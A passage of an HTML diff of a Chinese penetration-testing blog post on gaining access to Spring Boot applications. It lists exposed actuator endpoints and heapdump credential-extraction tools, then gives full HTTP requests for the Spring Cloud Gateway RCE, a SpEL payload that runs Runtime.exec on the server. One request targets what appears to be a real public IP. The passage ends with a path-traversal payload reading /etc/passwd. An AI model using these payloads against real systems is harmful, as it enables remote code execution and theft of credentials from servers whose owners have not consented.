+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">actuator</span><span class="o">/</span><span class="n">loggers</span><span class="o">/</span><span class="n">com</span><span class="p">.</span><span class="na">lark</span><span class="p">.</span><span class="na">oapi</span><span class="p">.</span><span class="na">service</span><span class="p">.</span><span class="na">mail</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;configuredLevel&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;DEBUG&#34;</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="actuatorheapdump实战中最常用"><font style="color:rgb(17, 17, 51);background-color:rgba(175, 184, 193, 0.2);">/actuator/heapdump&mdash;实战中最常用</font>
+</h4><p><a class="link" href="https://github.com/wyzxxz/heapdump_tool"  target="_blank" rel="noopener"
+    >https://github.com/wyzxxz/heapdump_tool</a></p>
+<p><a class="link" href="https://github.com/whwlsfb/JDumpSpider"  target="_blank" rel="noopener"
+    >https://github.com/whwlsfb/JDumpSpider</a></p>
+<p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/7.png"
+	width="2489"
+	height="1133"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/7_hu_5124cd24ed8c898d.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/7_hu_26eb595e83b39da0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="527px"
+	
+></p>
+<p>云存储AK/SK泄露</p>
+<p>数据库凭证泄露最常见</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">RedisStandaloneConfiguration</span><span class="p">:</span><span class="w"> </span><span class="n">hostName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">localhost</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">6379</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">redis</span><span class="p">:</span><span class="c1">//localhost:6379</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">这个表明redis未配置密码</span><span class="err">，</span><span class="n">存在redis未授权漏洞</span><span class="err">，</span><span class="n">可实现RCE</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Shiro Key泄露组合拳实现RCE</p>
+<p>系统架构与路径信息泄露</p>
+<h4 id="actuatormetrics"><font style="color:rgb(17, 17, 51);background-color:rgba(175, 184, 193, 0.2);">/actuator/metrics</font>
+</h4><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/8.png"
+	width="2550"
+	height="1018"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/8_hu_6997f545a678295d.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/8_hu_f31f25e87fdfbdee.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="601px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">actuator</span><span class="o">/</span><span class="n">metrics</span><span class="o">/</span><span class="n">http</span><span class="p">.</span><span class="na">server</span><span class="p">.</span><span class="na">requests</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">152</span><span class="p">:</span><span class="n">8082</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">143</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">143</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/9.png"
+	width="2532"
+	height="1010"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/9_hu_74f2621b2ab124f3.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/9_hu_98a3cc224c3ca9db.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="601px"
+	
+></p>
+<h4 id="actuatorconfigprops泄露所有configurationproperties配置">/actuator/configprops&mdash;泄露所有<code>@ConfigurationProperties</code><font style="color:rgb(17, 17, 51);">配置</font>
+</h4><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/10.png"
+	width="2556"
+	height="1008"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/10_hu_8fee1a66618e68f.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/10_hu_1a1926f2cc0af49c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="608px"
+	
+></p>
+<h4 id="swagger未授权访问泄露所有后端接口和参数">/swagger未授权访问&mdash;泄露所有后端接口和参数
+</h4><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/11.png"
+	width="1652"
+	height="1058"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/11_hu_d5077feccec0e258.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/11_hu_a13001842077cae6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="374px"
+	
+></p>
+<h3 id="3"><font style="color:rgb(17, 17, 51);">3. </font><strong><font style="color:rgb(17, 17, 51);">高风险（可操作/执行类）</font></strong>
+</h3><p>⚠️ 这些端点在旧版本（Spring Boot &lt; 2.0）或特殊配置下可能被滥用</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong><font style="color:rgb(17, 17, 51);">端点</font></strong></th>
+          <th><strong><font style="color:rgb(17, 17, 51);">作用</font></strong></th>
+          <th><strong><font style="color:rgb(17, 17, 51);">风险</font></strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>/actuator/shutdown</code></td>
+          <td><strong><font style="color:rgb(17, 17, 51);">关闭应用</font></strong><font style="color:rgb(17, 17, 51);">（需显式启用）</font></td>
+          <td><font style="color:rgb(17, 17, 51);">DoS 攻击</font></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/restart</code></td>
+          <td><font style="color:rgb(17, 17, 51);">重启应用（需 Spring Cloud）</font></td>
+          <td><font style="color:rgb(17, 17, 51);">服务中断</font></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/refresh</code></td>
+          <td><font style="color:rgb(17, 17, 51);">刷新配置（配合 Spring Cloud Config）</font></td>
+          <td><font style="color:rgb(17, 17, 51);">若结合</font><font style="color:rgb(17, 17, 51);"> </font><code>env</code><br/><font style="color:rgb(17, 17, 51);"> </font><font style="color:rgb(17, 17, 51);">修改配置，可能触发 RCE（见下文）</font></td>
+      </tr>
+  </tbody>
+</table></div>
+<h2 id=""><strong><font style="color:rgb(17, 17, 51);">2.Spring Boot常见漏洞</font></strong>
+</h2><p><a class="link" href="https://github.com/AabyssZG/SpringBoot-Scan"  target="_blank" rel="noopener"
+    >https://github.com/AabyssZG/SpringBoot-Scan</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/pRwLkFSlVcev7srsMPRuqQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/pRwLkFSlVcev7srsMPRuqQ</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/ArQRB02DvMIVe-dn6ZiTYw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/ArQRB02DvMIVe-dn6ZiTYw</a></p>
+<h3 id="21spring-cloud-gateway-rce漏洞">2.1.Spring Cloud Gateway RCE漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">actuator</span><span class="o">/</span><span class="n">gateway</span><span class="o">/</span><span class="n">routes</span><span class="o">/</span><span class="n">oWNcO</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">81</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">4044</span><span class="p">.</span><span class="na">129</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="p">,</span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">6</span><span class="p">.</span><span class="na">2</span><span class="p">;</span><span class="w"> </span><span class="n">WOW64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">30</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1599</span><span class="p">.</span><span class="na">17</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">427</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="s">&#34;id&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;oWNcO&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="s">&#34;filters&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;AddResponseHeader&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;args&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Result&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\&#34;id\&#34;}).getInputStream()))}&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="o">]</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="s">&#34;uri&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;http://example.com&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="s">&#34;order&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">actuator</span><span class="o">/</span><span class="n">gateway</span><span class="o">/</span><span class="n">refresh</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">131</span><span class="p">:</span><span class="n">8080</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">actuator</span><span class="o">/</span><span class="n">gateway</span><span class="o">/</span><span class="n">routes</span><span class="o">/</span><span class="n">oWNcO</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">81</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">4044</span><span class="p">.</span><span class="na">129</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="p">,</span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">6</span><span class="p">.</span><span class="na">2</span><span class="p">;</span><span class="w"> </span><span class="n">WOW64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">30</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1599</span><span class="p">.</span><span class="na">17</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">427</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DELETE</span><span class="w"> </span><span class="o">/</span><span class="n">actuator</span><span class="o">/</span><span class="n">gateway</span><span class="o">/</span><span class="n">routes</span><span class="o">/</span><span class="n">oWNcO</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">152</span><span class="p">.</span><span class="na">136</span><span class="p">.</span><span class="na">119</span><span class="p">.</span><span class="na">199</span><span class="p">:</span><span class="n">8082</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">6</span><span class="p">.</span><span class="na">1</span><span class="p">;</span><span class="w"> </span><span class="n">WOW64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">23</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20130406</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">23</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="22spring框架目录遍历漏洞cve-2024-38816">2.2.<font style="color:rgb(51, 51, 51);">Spring框架目录遍历漏洞CVE-2024-38816</font>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="kd">static</span><span class="o">/</span><span class="n">link</span><span class="o">/%</span><span class="n">2e</span><span class="o">%</span><span class="n">2e</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="23任意文件读取">2.3.任意文件读取
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
